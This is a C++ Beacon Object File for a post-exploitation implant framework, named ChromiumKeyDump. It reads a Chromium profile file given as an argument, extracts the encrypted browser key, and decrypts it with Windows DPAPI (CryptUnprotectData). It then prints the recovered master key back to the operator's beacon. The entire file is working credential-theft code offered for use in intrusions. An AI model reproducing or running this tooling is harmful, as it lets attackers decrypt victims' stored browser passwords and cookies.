#define _WIN32_WINNT 0x06000000 // For Mingw

#include <windows.h>
#include <shlobj.h>

extern "C" {
    #include "beacon.h"
}

#define BOF_REDECLARE(mod, func) extern "C" __declspec(dllimport) decltype(func) mod ## $ ## func 
#define BOF_LOCAL(mod, func) decltype(func) * func = mod ## $ ## func

BOF_REDECLARE(KERNEL32, ReadFile);
BOF_REDECLARE(KERNEL32, CreateFileW);
BOF_REDECLARE(KERNEL32, CloseHandle);
BOF_REDECLARE(KERNEL32, LocalFree);
BOF_REDECLARE(CRYPT32, CryptStringToBinaryA);
BOF_REDECLARE(CRYPT32, CryptBinaryToStringA);
BOF_REDECLARE(CRYPT32, CryptUnprotectData);
BOF_REDECLARE(SHELL32, SHGetKnownFolderPath);
BOF_REDECLARE(MSVCRT, malloc);
BOF_REDECLARE(MSVCRT, free);
BOF_REDECLARE(MSVCRT, strncpy);
BOF_REDECLARE(NTDLL, memcpy);
BOF_REDECLARE(KERNEL32, lstrcatW);
BOF_REDECLARE(KERNEL32, lstrlenW);
BOF_REDECLARE(KERNEL32, GetLastError);
BOF_REDECLARE(MSVCRT, mbstowcs);
BOF_REDECLARE(MSVCRT, strlen);

#define BOF_LOCALS \
    BOF_LOCAL(KERNEL32, ReadFile); \
    BOF_LOCAL(KERNEL32, CreateFileW); \
    BOF_LOCAL(KERNEL32, CloseHandle); \
    BOF_LOCAL(KERNEL32, LocalFree); \
    BOF_LOCAL(CRYPT32, CryptStringToBinaryA); \
    BOF_LOCAL(CRYPT32, CryptBinaryToStringA); \
    BOF_LOCAL(CRYPT32, CryptUnprotectData); \
    BOF_LOCAL(SHELL32, SHGetKnownFolderPath); \
    BOF_LOCAL(MSVCRT, malloc); \
    BOF_LOCAL(MSVCRT, free); \
    BOF_LOCAL(MSVCRT, strncpy); \
    BOF_LOCAL(NTDLL, memcpy); \
    BOF_LOCAL(KERNEL32, lstrcatW); \
    BOF_LOCAL(KERNEL32, lstrlenW); \
    BOF_LOCAL(KERNEL32, GetLastError); \
    BOF_LOCAL(MSVCRT, mbstowcs); \
    BOF_LOCAL(MSVCRT, strlen);

extern "C" void go(char* args, int alen) {
    BOF_LOCALS;

    datap  parser;
    char *path;
    WCHAR szFilePath[MAX_PATH];

    BeaconDataParse(&parser, args, alen);
    path = BeaconDataExtract(&parser, NULL);
    
    const size_t size = strlen(path) + 1;
    mbstowcs(szFilePath, path, size);

    BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", szFilePath);

    HANDLE hFile = CreateFileW(szFilePath, FILE_READ_ACCESS, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CreateFileW failed lasterror=%08x\n", GetLastError());
        return;
    }

    DWORD dwReaded;
    char file_read[2048];
    bool key_found = false;
    char encKey[500];
    encKey[0] = '\0';
    int prepos = 0;

    while(ReadFile(hFile, &file_read, sizeof(file_read), &dwReaded, NULL) && dwReaded) {

        for (int i = 0; i < sizeof(file_read); i++)
        {
            if ((file_read[i-6] == 107) && (file_read[i - 5] == 101) && (file_read[i - 4] == 121) && (file_read[i - 3] == 34) && (file_read[i - 2] == 58) && (file_read[i - 1] == 34)) { // key":"
                BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Found EncryptedKey at position: %i\n", prepos + i + 1);
                
                for (int j = i; j < sizeof(file_read); j++) {
                    if (file_read[j] == 34) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] EncryptedKey total length: %i\n", j - i);
                        strncpy(encKey, &file_read[i], j - i);
                        encKey[j - i] = '\0';
                        key_found = true;
                        break;
                    }
                }

                if (!key_found) {
                    prepos = sizeof(file_read) - i;
                    strncpy(encKey, &file_read[i], prepos);

                    ReadFile(hFile, &file_read, sizeof(file_read), &dwReaded, NULL);
                    for (int k = 0; k < sizeof(file_read); k++) {
                        if (file_read[k] == 34) {
                            BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] EncryptedKey total length: %i\n", prepos + k);
                            strncpy(encKey + prepos, &file_read[0], k);
                            encKey[prepos + k] = '\0';
                            key_found = true;
                            break;
                        }
                    }
                }
                break;
            }   
        }
        if (key_found) {
            break;
        }
        prepos += dwReaded;
    }

    CloseHandle(hFile);

    if (encKey[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] EncryptedKey not found\n");
        return;
    }

    DWORD bufLen = 0;
    CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, NULL, &bufLen, NULL, NULL);
    BYTE* decBuf1 = (BYTE*)malloc(bufLen);
    CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, decBuf1, &bufLen, NULL, NULL);
    BYTE* decBuf2 = &decBuf1[5];

    DATA_BLOB DataIn;
    DataIn.cbData = bufLen - 5;
    DataIn.pbData = (PBYTE)decBuf2;

    DATA_BLOB DataOut;
    DataOut.cbData = 0;
    DataOut.pbData = NULL;

    if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        DWORD deckeyLen = 0;
        CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, NULL, &deckeyLen);
        char* decKey = (char*)malloc(deckeyLen);
        CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, decKey, &deckeyLen);
        BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Masterkey: %s\n", decKey);
        free(decKey);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CryptUnprotectData failed\n");
    }
    free(decBuf1);
    LocalFree(DataOut.pbData);
};
